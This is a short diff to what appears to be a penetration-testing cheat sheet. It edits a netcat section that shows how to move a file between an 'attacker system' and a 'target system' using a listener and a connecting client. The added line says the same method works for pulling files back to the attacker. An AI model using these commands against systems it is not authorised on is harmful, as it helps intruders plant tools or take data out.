@@ -23,8 +23,10 @@ Python2
 
 ###### netcat
 ```
-On the attacker system:
-> nc -lvp 80 > file.txt
 On the target system:
+> nc -lvp 80 > file.txt
+On the attacker system:
 > nc 192.168.1.1 80 < file.txt
+
+Also works the other way, to get files back to the attacker system
 ```
